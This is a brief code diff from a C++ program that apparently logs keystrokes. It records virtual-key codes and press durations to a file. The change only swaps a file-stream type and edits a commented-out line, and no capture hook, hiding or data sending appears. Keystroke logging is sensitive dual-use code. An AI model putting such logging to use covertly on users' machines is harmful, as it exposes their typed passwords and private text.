@@ -39,7 +39,7 @@ DWORD lastAction = 0x0;
 DWORD* keyDuration = new DWORD[253];
 std::string* stringStore = new std::string[253];
 //FILE* fp;
-std::ofstream fp;
+std::fstream fp;
 
 
 int lineCount = 0;
@@ -195,7 +195,7 @@ void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp)
 	case VK_BACK:
 	{
 		// When this is found, we will delete the last line in the file.
-		//std::getline(fp, std::iostream::end);
+		//std::getline(fp, std::fstream::end);
 		break;
 	}
 	case VK_LWIN:
